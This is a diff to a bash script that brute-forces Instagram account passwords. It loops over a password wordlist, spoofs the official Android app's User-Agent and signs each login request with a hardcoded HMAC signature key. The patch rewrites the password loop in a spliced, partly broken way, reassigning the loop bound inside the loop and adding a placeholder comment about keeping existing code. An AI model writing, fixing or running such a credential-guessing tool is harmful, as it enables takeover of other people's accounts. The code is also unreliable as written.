@@ -1,4 +1,6 @@
-#!/bin/bash𝙆𝙝𝙖𝙡𝙞𝙙 𝙃𝙪𝙨𝙖𝙞𝙣
+#!/bin/bash
+# Khalid Husain
+
 # Coded by: 
 # Instagram: @khalidhusin786
 
@@ -135,13 +137,21 @@ startline=1
 endline="$threads"
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
-for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
+sed -n "${startline},${endline}p" "$wl_pass" | while IFS= read -r pass; do
+    pass="${pass//$'\r'/}"
+    pass="${pass//$'\n'/}"
+
+    echo "Trying: [$pass]"
+
+    # keep your existing code below
+
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 IFS=$'\n'
-countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
+count_pass=$(wc -l < "$wl_pass")
+
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
